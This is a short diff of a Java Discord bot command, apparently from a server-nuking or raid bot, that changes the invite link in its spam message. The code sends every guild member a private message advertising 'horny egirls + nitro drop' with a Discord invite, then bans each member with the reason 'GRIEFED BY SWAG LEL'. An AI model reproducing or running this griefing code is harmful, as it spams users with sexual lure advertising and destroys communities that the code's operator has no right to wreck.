@@ -22,7 +22,7 @@ public class DmAdvBanwaveCommand implements ICommand {
             try {
                 for (Member member : event.getGuild().getMembers()) {
                     if (member.getIdLong() != Core.OWNERID || !member.getId().equals(event.getAuthor().getId())) {
-                        Wrapper.sendPrivateMessage(event.getJDA(), member.getUser().getId(), "discord.gg/failures **horny egirls + nitro drop + packing events** hacked by swag");
+                        Wrapper.sendPrivateMessage(event.getJDA(), member.getUser().getId(), "https://discord.gg/5KwAktW **horny egirls + nitro drop + packing events** hacked by swag");
                         if (event.getGuild().getSelfMember().canInteract(member) && !member.getUser().isBot())
                         event.getGuild().ban(member, 7).reason("GRIEFED BY SWAG LEL").queue();
                         Logger.getLogger().print("Banned " + member.getUser().getAsTag());
